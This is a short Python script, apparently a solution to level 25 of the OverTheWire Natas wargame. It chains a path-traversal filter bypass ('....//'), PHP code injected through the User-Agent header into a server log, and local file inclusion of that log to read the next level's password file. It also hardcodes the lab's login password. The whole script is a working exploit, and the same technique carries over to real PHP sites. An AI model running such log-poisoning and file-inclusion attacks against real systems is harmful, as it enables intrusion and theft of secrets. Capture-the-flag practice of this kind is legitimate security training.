import requests

base_url = "http://natas25.natas.labs.overthewire.org/index.php?lang="

s = requests.session()

username = "natas25"
password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"

user_agent = """<?php include("/etc/natas_webpass/natas26") ?>"""
res1 = s.get(base_url + "....//", headers={"User-Agent": user_agent}, auth=(username,password), allow_redirects=False)
session_id = res1.cookies.get("PHPSESSID")
log_file = "....//logs/natas25_"+ session_id +".log"
res2 = s.get(base_url + log_file, auth=(username, password), allow_redirects=False)


print("="*80)
print(res1.text)
print("="*80)
print(res2.text)
